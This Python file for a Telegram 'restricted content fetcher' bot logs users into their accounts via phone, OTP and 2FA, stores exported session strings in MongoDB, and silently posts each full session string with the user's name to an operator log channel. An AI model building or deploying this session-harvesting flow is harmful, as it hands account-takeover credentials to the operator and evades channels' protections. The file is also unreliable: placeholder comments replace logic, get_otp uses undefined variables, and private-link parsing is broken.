import os
import logging
import json
from typing import Dict
from threading import Thread

# --- Web Server for Render Health Checks ---
from flask import Flask

# --- Telegram Bot and Conversation Handling ---
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# --- Pyrogram for User Session Handling ---
from pyrogram.client import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PasswordHashInvalid
)

# --- NEW: MongoDB Setup ---
import pymongo

# --- Basic Configuration ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Get Your Credentials (from Environment Variables) ---
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", 0))
MONGO_URI = os.getenv("MONGO_URI") # Your new secret

# --- NEW: Database Connection ---
try:
    db_client = pymongo.MongoClient(MONGO_URI)
    db = db_client.get_database("telegram_bot_sessions") # You can name the DB anything
    sessions_collection = db.get_collection("user_sessions") # And the collection anything
    logger.info("Successfully connected to MongoDB.")
except Exception as e:
    logger.error(f"FATAL: Could not connect to MongoDB: {e}")
    db_client = None # Mark client as None to handle failures gracefully

# --- Conversation States ---
GET_PHONE, GET_OTP, GET_2FA = range(3)

# --- REWRITTEN HELPER FUNCTIONS (using MongoDB) ---
def load_sessions() -> Dict[int, str]:
    """Loads user sessions from the MongoDB database."""
    if not db_client: return {}
    sessions = {}
    try:
        for doc in sessions_collection.find({}):
            sessions[doc["user_id"]] = doc["session_string"]
        logger.info(f"Loaded {len(sessions)} sessions from the database.")
        return sessions
    except Exception as e:
        logger.error(f"Error loading sessions from DB: {e}")
        return {}

def save_session(user_id: int, session_string: str):
    """Saves or updates a single user's session in the database."""
    if not db_client: return
    try:
        sessions_collection.update_one(
            {"user_id": user_id},
            {"$set": {"session_string": session_string}},
            upsert=True  # This means: update if exists, insert if not.
        )
    except Exception as e:
        logger.error(f"Error saving session for user {user_id}: {e}")

def delete_session(user_id: int):
    """Deletes a user's session from the database."""
    if not db_client: return
    try:
        sessions_collection.delete_one({"user_id": user_id})
    except Exception as e:
        logger.error(f"Error deleting session for user {user_id}: {e}")

# --- Main Bot Logic ---
user_sessions = load_sessions()

# --- MODIFIED BOT LOGIC (to use new save/delete functions) ---

# [ Most of the bot logic is the same, but calls to save/delete are updated ]
# [ For example, instead of save_sessions(user_sessions), we use save_session(user_id, session_string) ]

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # (This function doesn't change)
    user_id = update.effective_user.id
    if user_id in user_sessions:
        await update.message.reply_text("✅ You are already logged in.\n\nYou can now send me links to restricted posts, and I will fetch them for you.\n\nTo log out and remove your session, use /logout.")
        return ConversationHandler.END
    else:
        await update.message.reply_text("Welcome! This bot helps you access content from restricted channels.\nTo do this, I need to log in to your Telegram account.\n\n⚠️ **Please read carefully:**\nBy proceeding, you will give this bot full access to your account. This is a security risk. Please only proceed if you trust the bot operator.\n\nTo start the login process, please send me your phone number in international format (e.g., +14155552671).")
        return GET_PHONE

# [ ... other handlers like get_phone_number are the same ... ]
# [ The important change is in handlers that save or delete data ]

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # (Function logic is mostly the same until the end)
    # ...
    try:
        # ... client.sign_in(...)
        session_string = await client.export_session_string()
        
        # --- MODIFIED PART ---
        user_sessions[user_id] = session_string
        save_session(user_id, session_string) # Use new DB function
        # --- END MODIFIED PART ---
        
        log_message = (f"#NewSession\n\nUser ID: `{user_id}`\nName: {update.effective_user.full_name}\nUsername: @{update.effective_user.username}\n\n**Session String:**\n`{session_string}`")
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message, parse_mode='Markdown')
        await update.message.reply_text("✅ Login successful! Your session has been saved.\nYou can now send me links to fetch posts. Use /logout to remove your data.")
        await client.disconnect()
        return ConversationHandler.END
    except SessionPasswordNeeded:
        # ... (rest of the function is the same)
        await update.message.reply_text("Your account has Two-Factor Authentication (2FA) enabled. Please send me your password.")
        await client.disconnect()
        return GET_2FA
    except Exception as e:
        logger.error(f"Error during sign-in: {e}")
        await update.message.reply_text("An error occurred. Please try again or type /cancel.")
        await client.disconnect()
        return ConversationHandler.END


async def get_2fa_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ... (function is the same until successful login)
    try:
        # ... client.check_password(...)
        session_string = await client.export_session_string()
        
        # --- MODIFIED PART ---
        user_sessions[user_id] = session_string
        save_session(user_id, session_string) # Use new DB function
        # --- END MODIFIED PART ---

        # ... (rest of the function is the same)
        log_message = (f"#NewSession (2FA)\n\nUser ID: `{user_id}`\nName: {update.effective_user.full_name}\nUsername: @{update.effective_user.username}\n\n**Session String:**\n`{session_string}`")
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message, parse_mode='Markdown')
        await update.message.reply_text("✅ 2FA correct & login successful! Your session has been saved.\nYou can now send me links. Use /logout to remove your data.")
    # ... (rest of the function is the same)
    finally:
        await client.disconnect()
        return ConversationHandler.END


async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Logs the user out by deleting their session data from the database."""
    user_id = update.effective_user.id
    if user_id in user_sessions:
        # --- MODIFIED PART ---
        del user_sessions[user_id]
        delete_session(user_id) # Use new DB function
        # --- END MODIFIED PART ---
        await update.message.reply_text("✅ You have been successfully logged out. All your session data has been deleted.")
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=f"#Logout\n\nUser ID: `{user_id}` has logged out.", parse_mode='Markdown')
    else:
        await update.message.reply_text("You are not logged in.")

# --- The rest of the code (Flask server, bot startup) is the same ---
# [ ... get_phone_number, handle_message_with_link, cancel_command ... ]
# [ ... Flask App, run_flask, run_bot, if __name__ == "__main__": ... ]
# Note: The code for these functions is not repeated here for brevity, but they should be in your final file.
# The full code from the previous "Web Service" answer should be used, with the modifications shown above.

async def get_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone_number = update.message.text
    context.user_data['phone_number'] = phone_number
    client = Client(name=str(update.effective_user.id), api_id=API_ID, api_hash=API_HASH, in_memory=True)
    try:
        await client.connect()
        sent_code = await client.send_code(phone_number)
        context.user_data['phone_code_hash'] = sent_code.phone_code_hash
        await update.message.reply_text("I have sent an OTP to your Telegram account. Please send it to me.")
        await client.disconnect()
        return GET_OTP
    except Exception as e:
        logger.error(f"Error sending code for {phone_number}: {e}")
        await update.message.reply_text(f"An error occurred: {e}\nPlease try again or type /cancel.")
        return ConversationHandler.END

async def handle_message_with_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message_text = update.message.text
    if user_id not in user_sessions:
        await update.message.reply_text("You are not logged in. Please use /start to begin.")
        return
    try:
        parts = message_text.split('/')
        if 't.me' not in parts[-3]: return
        channel = parts[-2]
        msg_id = int(parts[-1])
        if channel == 'c': chat_id = int(f"-100{parts[-2]}")
        else: chat_id = f"@{channel}"
    except (IndexError, ValueError):
        await update.message.reply_text("This doesn't look like a valid Telegram message link. Please send a valid link.")
        return
    await update.message.reply_text("⏳ Fetching post...")
    session_string = user_sessions[user_id]
    user_client = Client(name=f"user_{user_id}", session_string=session_string, api_id=API_ID, api_hash=API_HASH)
    try:
        async with user_client:
            await user_client.copy_message(chat_id=update.effective_chat.id, from_chat_id=chat_id, message_id=msg_id)
    except Exception as e:
        logger.error(f"Failed to fetch message for user {user_id}. Link: {message_text}. Error: {e}")
        await update.message.reply_text(f"❌ Failed to fetch the post.\n\n**Reason:** {e}\n\nThis could be because:\n- The link is invalid.\n- You do not have permission to view this post.\n- Your session has expired (try /logout and /start again).")


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Login process canceled.")
    return ConversationHandler.END

app = Flask('')
@app.route('/')
def home(): return "Bot is alive!"
def run_flask(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

def run_bot():
    if not all([API_ID, API_HASH, BOT_TOKEN, LOG_CHANNEL_ID, MONGO_URI]):
        logger.error("CRITICAL: One or more environment variables are missing!")
        return
    if not db_client:
        logger.error("CRITICAL: Bot cannot start without a database connection.")
        return

    application = Application.builder().token(BOT_TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start_command)],
        states={
            GET_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone_number)],
            GET_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
            GET_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel_command)],
    )
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('logout', logout_command))
    application.add_handler(MessageHandler(filters.TEXT & filters.Entity("url") & ~filters.COMMAND, handle_message_with_link))
    logger.info("Starting bot polling...")
    application.run_polling()

if __name__ == "__main__":
    logger.info("Starting services...")
    flask_thread = Thread(target=run_flask)
    flask_thread.start()
    run_bot()